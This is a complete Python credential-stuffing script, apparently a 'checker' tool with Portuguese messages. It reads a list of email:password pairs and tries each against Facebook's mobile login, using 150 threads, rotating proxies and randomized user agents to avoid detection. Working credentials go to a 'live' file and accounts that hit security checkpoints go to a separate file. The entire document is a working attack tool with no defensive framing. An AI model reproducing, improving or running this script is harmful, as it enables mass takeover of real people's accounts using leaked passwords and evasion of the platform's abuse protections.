import requests
import os
import sys
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import Lock
from random_user_agent.params import HardwareType
from random_user_agent.user_agent import UserAgent

global lock

lock = Lock()


try:
    if os.path.exists(sys.argv[1]):
        arquivo = open(sys.argv[1],"r",encoding='ISO-8859-1').read().split("\n")
    else:
        print("Arquivo inexistente.")
except:
    print("Forma de uso: python main.py lista.txt")


proxies = {
    'https': '', #colocar proxy rotativa.
    'http': ''
}


def login(session, email, password):
    email = email.strip()
    password = password.strip()
    try:
        response = session.post(
            "https://m.facebook.com/login.php",
            data={"email": email, "pass": password},
            allow_redirects=False,
            proxies=proxies
        )
        if response.status_code == 302:
            location = response.headers["Location"]
            if "checkpoint" in location:
                lock.acquire()
                print(f"[DIE] {email}:{password} Checkpoint!")
                print(f"{email}:{password}", file=open("checkpoint.txt", "a+"))
                lock.release()
                return False
            if "c_user" in session.cookies:
                lock.acquire()
                print(f"[LIVE] {email}:{password}")
                print(f"[LIVE] {email}:{password}",file=open("livess.txt", "a+"))
                lock.release()
                return True
        lock.acquire()
        print(f"{email}:{password} - {response.status_code} {response.url}")
        lock.release()
        return False
    except requests.exceptions.ProxyError as err:
        print(err)
        login(session, email, password)


hardware_types = [HardwareType.MOBILE.value]
user_agent_rotator = UserAgent(hardware_types=hardware_types)


def chk(linha):
    email, senha = linha.strip().split(':')
    session = requests.session()
    user_agent = user_agent_rotator.get_random_user_agent()
    session.headers.update({
        'User-Agent': user_agent
    })
    login(session, email, senha)



if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=150) as executor:
        future = executor.map(chk, arquivo)